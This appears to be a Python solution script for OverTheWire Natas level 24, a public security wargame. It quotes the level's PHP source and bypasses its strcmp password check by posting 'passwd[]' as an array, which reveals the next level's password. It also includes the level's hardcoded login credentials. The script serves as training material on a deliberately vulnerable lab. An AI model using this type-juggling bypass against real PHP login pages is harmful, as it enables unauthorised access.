#!/usr/bin/env python3
'''
Level 24 → Level 25
PHP strcmp AbusePHP strcmp Abuse
https://www.youtube.com/watch?v=Cs2pgObqpyc&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=26

github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas24.py

Username: natas24
URL:      http://natas24.natas.labs.overthewire.org
          http://natas24.natas.labs.overthewire.org/index-source.html
=======================================================
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
problem:


write up:
'''
import requests
import re
username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'


url = 'http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()
response = session.get(url, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)
session = requests.Session()

response = session.post(url, data = {'passwd[]': 'plzsub'}, auth = (username, password))
print (response.text)
"""
Because PHP expect a string and we are passing an array 'passwd[]', The 
strcmp($_REQUEST["passwd"] will return 0 and !0=1 so the echo will return the
passward
dfg
"""
print ("\nPassword for natas25 = ", re.findall('Password: (.*)',response.text)[0])

